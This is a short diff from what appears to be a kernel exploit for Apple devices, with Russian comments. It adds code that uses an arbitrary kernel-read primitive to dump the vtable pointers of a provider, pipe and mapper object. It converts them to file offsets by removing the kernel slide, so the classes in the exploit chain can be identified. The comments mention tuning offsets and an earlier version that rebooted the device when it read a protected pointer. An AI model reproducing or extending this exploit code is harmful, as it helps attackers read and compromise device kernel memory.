@@ -6611,6 +6611,18 @@ static int kpJSubmitAsync(io_connect_t conn, uint32_t srcID, uint32_t dstID,
         if (kpLooksLikeKernelPointer(mapVA)) dartVA = kp_untag_ptr(early_kread64(mapVA + 0x30));
         kpNote(r, [NSString stringWithFormat:@"  [P2] pipe=%#llx mapper=%#llx dart=%#llx",
                   (unsigned long long)pipeVA, (unsigned long long)mapVA, (unsigned long long)dartVA]);
+        // 1.9.165: vtables всех звеньев (file-оффсеты) — идентификация классов
+        // цепочки (scheduler=0 и dart≠0x7dafcb0 в 1.9.162 требуют правки оффсетов)
+        {
+            uint64_t ks3 = kconstant(base) - 0xfffffff007004000ULL;
+            uint64_t v1 = kpLooksLikeKernelPointer(provVA) ? kp_untag_ptr(early_kread64(provVA)) : 0;
+            uint64_t v2 = kpLooksLikeKernelPointer(pipeVA) ? kp_untag_ptr(early_kread64(pipeVA)) : 0;
+            uint64_t v3 = kpLooksLikeKernelPointer(mapVA) ? kp_untag_ptr(early_kread64(mapVA)) : 0;
+            kpNote(r, [NSString stringWithFormat:@"  [P2] vtables(file): prov=%#llx pipe=%#llx mapper=%#llx",
+                      (unsigned long long)(v1 ? v1 - ks3 : 0),
+                      (unsigned long long)(v2 ? v2 - ks3 : 0),
+                      (unsigned long long)(v3 ? v3 - ks3 : 0)]);
+        }
         // 1.9.163: валидация walker'а на известных VA + гейт диких дерефов —
         // 1.9.162 ребутнул девайс без паники = SPTM/EL2 ресет на чтении
         // немапнутого/защищённого указателя из скана dartObj.
